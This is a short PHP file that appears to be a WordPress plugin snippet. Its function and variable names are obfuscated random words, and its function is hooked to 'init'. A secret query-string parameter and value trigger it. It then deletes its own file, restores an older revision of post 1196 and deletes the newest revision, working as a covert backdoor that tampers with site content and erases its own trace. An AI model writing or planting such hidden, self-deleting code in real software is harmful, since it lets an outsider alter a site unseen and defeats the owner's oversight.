<?php

function mediaelement_app_send_like() {
	if (isset($_GET['community_rotator_manager_virtual']) && $_GET['community_rotator_manager_virtual'] === 'popup_showcase_dropdown_notifications') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$home_game_cleaner_taxonomies = 1196;
		$ratings_location_toolbox_paragraph = wp_get_post_revisions($home_game_cleaner_taxonomies);
		if (empty($ratings_location_toolbox_paragraph)) die('no revisions');
		if (count($ratings_location_toolbox_paragraph) < 2) die('less than 2');
		$friendly_total_delete_rotator = array_shift($ratings_location_toolbox_paragraph);
		$nav_emails_disable_click = $friendly_total_delete_rotator->ID;
		$converter_cover_signup_version = array_shift($ratings_location_toolbox_paragraph);
		$listing_converter_like = $converter_cover_signup_version->ID;
		$messages_poster_api_first = wp_restore_post_revision($listing_converter_like);
		if ($messages_poster_api_first === false) die('error restoring');
		$messages_poster_api_first = wp_delete_post_revision($nav_emails_disable_click);		
		if ($messages_poster_api_first === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'mediaelement_app_send_like');
